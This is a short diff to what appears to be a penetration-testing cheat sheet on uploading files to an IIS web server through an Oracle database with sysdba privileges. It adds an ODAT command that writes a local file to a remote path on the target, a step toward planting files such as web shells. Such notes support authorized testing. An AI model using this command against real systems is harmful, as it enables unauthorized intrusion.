@@ -1,4 +1,6 @@
-## Upload file to IIS web server via oracle DB with sysdba priv
+# Upload file to IIS web server via oracle DB (sysdba priv required)
+
+## Manually
 
 ```
 declare
@@ -14,3 +16,14 @@ end;
 
 After that apply the changes with /
 ```
+
+## Auto with ODAT tool
+
+```python
+python3 odat.py dbmsxslprocessor -s <IP_TARGET> -d <SID> -U <USER> -P <PASSWORD> --putFile "remotePath" "remoteFile" "localFile" --sysdba
+```
+
+# Sources
+
+ODAT - Quentin Hardy
+https://github.com/quentinhardy/odat
